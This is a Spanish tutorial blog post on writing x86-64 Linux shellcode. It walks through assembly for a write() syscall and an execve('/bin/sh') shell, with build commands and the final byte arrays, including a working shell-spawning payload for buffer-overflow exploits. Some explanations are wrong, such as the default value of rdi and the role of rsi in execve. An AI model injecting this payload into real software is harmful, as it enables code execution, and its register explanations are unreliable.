---
layout: post
title: Shellcodes - syscall write() y execve(bin/sh)
author: c4rta
date: 2023-06-07
##categories: [Un Poco De Web Pentest, SSTI]
tags: [MalDev]
image: /assets/img/shellcode/waifu.png
---
Veremos a como puedes crear shellcodes, te enseñare como crear una usando la syscall write() y otra usando execve() para ejecutar bin/sh
{:.lead}

## Shellcodes

Las shellcodes son un conjunto de instrucciones de bajo nivel (ensamblador) que se inyectan en la memoria de un programa con el fin de ejecutar codigo

Actualemente son usadas ampliamente para ejecutar codigo malicioso, de hecho, si alguna vez explotaste un buffer overflow stack-based, estoy seguro de que las usaste al menos un vez, por otra parte, tambien son muy usadas en el desarrollo de malware, ya que hay muchas tecnicas diferentes para inyectarlas, al fin de cuenta, con las shellcodes puedes ejecutar casi cualquier cosa o cualquier cosa, y esto es gracias a la syscalls

## Syscalls

Las syscalls son metodos establecidos por el sistema operativo para decirle al kernel que realice una tarea, por ejemplo, tenemos este codigo:

```c
#include <stdio.h>

void main() {
  printf("ola\n");
}
```
Es muy simple, de hecho, podemos decir que nomas tiene 3 intrucciones, el ```include```, ```printf``` y el ```void main()```. pero la cantidad de syscalls que hace es increible, usaremos el comando ```strace``` para interceptar y registrar todas las syscalls que hace nuestro binario: ```strace ./binario```, y esto arroja:

```
execve("./prueba", ["./prueba"], 0x7ffc3236ede0 /* 57 vars */) = 0
brk(NULL)                               = 0x5555f3c59000
arch_prctl(0x3001 /* ARCH_??? */, 0x7ffe25dc3f10) = -1 EINVAL (Invalid argument)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=167079, ...}, AT_EMPTY_PATH) = 0
mmap(NULL, 167079, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fde591cf000
close(3)                                = 0
openat(AT_FDCWD, "/usr/lib/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\20:\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
newfstatat(3, "", {st_mode=S_IFREG|0755, st_size=1961632, ...}, AT_EMPTY_PATH) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fde591cd000
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
mmap(NULL, 2006640, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fde58fe3000
mmap(0x7fde59005000, 1429504, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x22000) = 0x7fde59005000
mmap(0x7fde59162000, 360448, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x17f000) = 0x7fde59162000
mmap(0x7fde591ba000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1d6000) = 0x7fde591ba000
mmap(0x7fde591c0000, 52848, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fde591c0000
close(3)                                = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fde58fe1000
arch_prctl(ARCH_SET_FS, 0x7fde591ce640) = 0
set_tid_address(0x7fde591ce910)         = 60068
set_robust_list(0x7fde591ce920, 24)     = 0
rseq(0x7fde591cef60, 0x20, 0, 0x53053053) = 0
mprotect(0x7fde591ba000, 16384, PROT_READ) = 0
mprotect(0x5555f2670000, 4096, PROT_READ) = 0
mprotect(0x7fde59229000, 8192, PROT_READ) = 0
prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
munmap(0x7fde591cf000, 167079)          = 0
newfstatat(1, "", {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x1), ...}, AT_EMPTY_PATH) = 0
getrandom("\x52\x39\x5a\x38\x9f\x83\x1b\x9e", 8, GRND_NONBLOCK) = 8
brk(NULL)                               = 0x5555f3c59000
brk(0x5555f3c7a000)                     = 0x5555f3c7a000
write(1, "ola\n", 4ola
)                    = 4
exit_group(4)                           = ?
+++ exited with 4 +++
```

Todas estas syscalls es lo que hace nuestro simple binario por detras, y nosotros no vemos este funcionamiento, solo vemos que imprime la cadena ola.

A lo que quiero llegar es que muchas de las instrucciones que hacemos en los lenguajes de programacion, tienen una syscall asociada, ya sea C, Python, Rust, Golang, etc, y es importante conocer las syscalls, por que cuando se desarrollan shellcodes, se llaman directamente a las sycalls tomando en cuenta su estructura.

Para llamar a syscalls desde lenguaje ensamblador se toman en cuenta las calling conventions, asi que para llamar a uns syscall se hace de esta forma ```syscall(rdi,rsi,rdx,r10,r8,r9)```, recuerda que los primeros 6 argumentos se pasan por los registos rdi,rsi,rdx,r10,r8,r9, y lo demas se pasa por el stack

## Shellcode usando write()

Esta syscall es usada para imprimir algo por la salida estandar (stdout), tiene la estructura:

```c
ssize_t write(int fd, const void *buf, size_t count);
```

- int fd: Es el descriptor de archivos donde se va a escribir, se puede establecer como 1(stdout), 2(sdterr), o cualquier otro descriptor que se abrio 

- void *buf: Es un puntero al buffer desde donde se empezaran a leer los datos 

- size_t count: Es el numero de bytes que se van a escribir

Ahora toca programiar en ensamblador:

Primeramente vamos a definir el inicio de nuestro programa, y lo hare de esta manera:

```
section .text
        global _start:

_start:
```

Con ```section .text``` le estoy diciendo que las instrucciones que le siguen, o apartir de ese punto, se van a almacenar en la seccion ```.text```, y eso es asi, por que esa seccion contiene las instrucciones que se van a ejecutar.

Con ```global _start``` le estoy diciendo que exporte los simbolos a partir de ```_start```, para que sean visiable desde fuera del archivo, y se hace con el fin de que puedan ser leidos por el enlazador (ld).

Y dentro de ```_start``` va todo nuestro codigo, y el programa completo se veria asi:

```
section .text
        global _start:

_start:
        mov rax, 1
        mov rsi, 0x616e757a614e
        push rsi
        mov rsi, rsp
        mov rdx, 6
        syscall  
        mov rax, 60
        syscall
```

- Con ```mov rax, 1``` estamos copiando el numero 1, al registro ```rax```, es 1, por que la syscall write esta asociada a ese numero en GNU/Linux

- ```mov rsi, 0x616e757a614e``` le estamos diciendo que copie el valor que queremos mostrar (0x616e757a614e), al registro ```rsi```, y en este caso, ```rsi``` va a funcionar como puntero al valor que se va a escribir

- ```push rsi``` Esta poniendo el registro ```rsi``` en el stack, con el fin de que la syscall pueda acceder a lo que queremos imprimir

- ```mov rsi, rsp``` Aqui le indicamos que copie la direccion del ```rsp``` al registro ```rsi```, y ahora si, ```rsi``` apunta al valor que vamos a imprimir el cual esta en el stack

- ```mov rdx, 6``` Le estamos indicando el tamaño en bytes de lo que se va a mostrar, asi que copia el tamaño de 6 bytes al registro rdx

- ```syscall``` se hace el llamado a write

- Las ultima dos instrucciones se hace el llamado a la syscall exit para que todo termine correctamente

**Ojo**

Te podras dar cuenta que no se usa el registro rdi, que para write, es usado para el descriptor de archivos, y diras: "Como es posible eso, si en la estructura de write se debe de establecer el registro rdi en 1, de hecho y [aca](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit) lo dice". Y pues no necesariamente, por que el descriptor de archivos ya tiene establecido por defecto el valor 1 para stdout.


Ahora procedemos a compilar: ```nasm -f elf64 shellcode.asm```

Esto nos dejara un archivo .o el cual debemos de enlazar: ```ld -m elf_x86_64 -s -o write shellcode.o```

Estos dos comandos nos dejo un binario elf, el cual si ejecutamos, se ejecutara la syscall write, y mostrara el texto:

![](/assets/img/shellcode/1.png)

Y a toda madre, funciona, pero eso no es una shellcode, es un binario elf, y si lo vemos en un editor hexadecimal podemos ver la shellcode en hexadecimal

![](/assets/img/shellcode/2.png)

Asi que para pasarla a un byte array, que seria la forma en la que se inyectan, primero usaremos

- ```objcopy -j .text -O binary shellcode.o write.bin``` para generar un archivo .bin

- ```hexdump -v -e '"\\" 1/1 "x%02x"' write.bin; echo``` para imprimir el byte array

Y ahora si, esto si es una shellcode a como estamos acostumbrados a verlas:

```
\xb8\x01\x00\x00\x00\x48\xbe\x4e\x61\x7a\x75\x6e\x61\x00\x00\x56\x48\x89\xe6\xba\x06\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\x0f\x05
```

## Shellcode para conseguir una shell

Ahora usaremos execve para poder ejecutar /bin/sh, y que consigamos una shell, el codigo es el siguiente:


```
section .text
    global _start

_start:

    xor rdx, rdx
    push rdx
    mov rax, 0x68732f2f6e69622f
    push rax
    mov rdi, rsp
    push rdx
    push rdi
    mov rsi, rsp
    xor rax, rax
    mov al, 0x3b
    syscall
```
Explicare directamente lo que esta dentro de ```_start``` por que lo demas ya saben que hace

- ```xor rdx, rdx``` El registo ```rdx``` haciendo una operacion XORing consigo mismo, esto es para que el registro este limpio antes de usarlo, es buena practica nomas, si se le quita no pasa nada

- ```push rdx``` Metemos un null bye al stack para indicar el final de la cadena que se le pasara como argumento a execve

- ```mov rax, 0x68732f2f6e69622f``` Copiamos /bin/sh al registro rax (la cadena esta en hex)

- ```push rax``` Metemos ```rax``` al stack para que pueda ser accedida por el ```rsp```

- ```mov rdi, rsp``` Copiamos la direccion de /bin/sh en ```rdi```, la cual sera el primer argumento de execve, en ese momento el ```rsp``` apunta a la direccion de /bin/sh

- ```push rdx``` Metemos otro byte nulo al stack

- ```push rdi``` Metemos la direccion de /bin/sh en el stack

- ```mov rsi, rsp``` Copiamos la direccion del ```rsp``` en ```rsi```, esto funcionara como segundo argumento de execve, que representa el entorno del programa que se ejecutara

- ```xor rax, rax``` Lo mismo que el primer ```xor```

- ```mov al, 0x3b``` Copiamos el valor 0x3b que representa el numero de la syscall, al registro ```al``` que funciona como un byte inferior de ```rax```, y por ultimo se ejecuta la syscall

Si volvemos a hacer todo el tramite de compilar y enlazar, ya tendremos nuestro ejetutable que nos da una shell, si vemos la shellcode en hex, todo esta perfecto:

![](/assets/img/shellcode/3.png)

Y si ejecutamos, nos da una shell:

![](/assets/img/shellcode/4.png)

Y listo, tenemos otra shellcode:

```
\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05
```

Y como ultimo, estos dos codigos que te explique, no es la unica forma de llamar a write o execve, ya depende del creador y del contexto donde se usa, y supongo que te ha pasado que cuando haces un BoF, una shellcode te sirve y otra no, aun que tengas todo tu exploit bien.

Eso ha sido todo, gracias por leer ❤